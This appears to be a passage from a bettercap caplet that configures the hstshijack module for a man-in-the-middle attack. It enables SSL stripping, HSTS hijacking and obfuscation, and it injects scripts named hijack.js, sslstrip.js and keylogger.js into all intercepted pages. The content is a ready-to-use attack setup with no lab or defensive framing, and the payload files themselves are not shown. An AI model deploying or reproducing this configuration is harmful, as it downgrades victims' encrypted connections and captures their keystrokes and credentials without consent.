...
set hstshijack.ssl.domains     ./hstshijack/domains.txt
set hstshijack.ssl.index       ./hstshijack/index.json
set hstshijack.ssl.check       true
#set hstshijack.blockscripts    example.com,*.example.com
set hstshijack.obfuscate       true
set hstshijack.payloads        *:./hstshijack/payloads/hijack.js,*:./hstshijack/payloads/sslstrip.js,*:./hstshijack/payloads/keylogger.js
set hstshijack.whitelist       ./hstshijack/whitelist.json
